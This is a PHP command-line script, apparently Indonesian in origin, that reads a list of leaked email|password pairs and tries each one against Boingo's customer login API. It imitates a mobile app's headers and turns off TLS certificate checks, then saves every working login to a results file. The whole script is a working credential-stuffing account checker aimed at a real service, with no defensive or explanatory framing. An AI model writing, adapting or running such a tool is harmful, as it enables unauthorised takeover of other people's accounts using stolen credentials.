<?php
function warna($text,$warna){
        $warna = strtoupper($warna);
        $list = array();
        $list['BLACK'] = "\033[30m";
        $list['RED'] = "\033[31m";
        $list['GREEN'] = "\033[32m";
        $list['YELLOW'] = "\033[33m";
        $list['BLUE'] = "\033[34m";
        $list['MAGENTA'] = "\033[35m";
        $list['CYAN'] = "\033[36m";
        $list['WHITE'] = "\033[37m";
        $list['RESET'] = "\033[39m";
        $warna = $list[$warna];
        $reset = $list['RESET'];
        if(in_array($warna,$list)){
                $text = "$warna$text$reset";
        }else{
                $text = $text;
        }
        return $text;
}
function curl($url,$data){
	$h = array();
	$h[] = "Cache-Control: no-cache";
	$h[] = "Content-Type: application/json";
	$h[] = "Host: boingo-api.boingo.com";
	$h[] = "Content-Length: ".strlen($data);
	$h[] = "Connection: Keep-Alive";
	$h[] = "Accept-Encoding: gzip";
	$h[] = "User-Agent: okhttp/3.10.0";
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL, $url);
	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	curl_setopt($ch, CURLOPT_HTTPHEADER, $h);
	curl_setopt($ch, CURLOPT_POST, 1);
	curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
	$asw = curl_exec($ch);
	curl_close($ch);
	return $asw;
}
function cek($user,$pass){
	$data = '{"password":"'.$pass.'","username":"'.$user.'"}';
	$c = json_decode(curl("https://boingo-api.boingo.com/2/customers/auth",$data),true);
	if($c['code']=="104"){
		$text = "$user|$pass => ".$c['message'];
		echo warna($text."\n","red");
	}else{
		$text = "$user|$pass => ".$c['message'];
		echo warna($text."\n","green");
		$h=fopen("hasil.txt","a+");
		fwrite($h, $text."\n");
		fclose($h);
	}
}
$file = file_get_contents($argv[1]);
if(!file_exists($argv[1])) exit("File Empass Gak ada!");
$ex = explode("\n",$file);
for($a=0;$a<count($ex);$a++){
	echo "[$a/".count($ex)."] ";
	$data = explode("|",$ex[$a]);
	$user = explode("@",$data[0])[0];
	$pass = $data[1];
	cek($user,$pass);
}